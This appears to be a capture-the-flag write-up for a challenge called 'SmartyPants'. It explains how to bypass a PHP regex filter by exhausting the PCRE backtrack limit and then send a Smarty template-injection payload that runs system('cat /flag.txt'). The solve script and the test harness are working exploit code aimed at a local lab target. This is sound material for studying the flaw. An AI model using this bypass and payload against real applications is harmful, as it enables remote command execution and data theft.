# SmartyPants Solution

The users input is filtered by a complex regex. A crafted payload can make the regex function backtrack so much that it reaches the PHP default backtrack limit.

When this happens preg_match returns false instead of 0 or 1 and the check for malicious content will fail.
After we bypass the regex we can use standard Smarty SSTI payloads to read the flag.

#### solve.py

```py
import requests

data={'data':f"on{'x'*1000000} {{system('cat /flag.txt')}}"}
print(data)
r = requests.post('http://localhost',data=data)
print(r.text.split('xxxxxx')[-1])
```

#### test.php

```php
<?php
function test($input,$limit){
	if($limit!=0){
		ini_set('pcre.backtrack_limit',$limit);
	}
	echo "Limit: ".ini_get('pcre.backtrack_limit').PHP_EOL;
	//$pattern = "/{+[{%]+[}%]+}/";
	//$pattern = "/(x+x+)+y/";
	$pattern = "/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+[{%]+.*[}%]+}+)/";
	$match = preg_match($pattern,$input);
	echo "PREG Error: ".preg_last_error_msg().PHP_EOL;

}

$val = "on".str_repeat('x',100).str_repeat(" ",100).'{{7*7}}'; //.str_repeat("%",1000000);
//die();
//$val = str_repeat('x',16); //.'y'; //"x"*100;

echo test($val,0).PHP_EOL;
echo test($val,1).PHP_EOL;
echo test($val,100).PHP_EOL;
echo test($val,1000).PHP_EOL;
echo test($val,10000).PHP_EOL;
//echo test($val,100000).PHP_EOL;
```
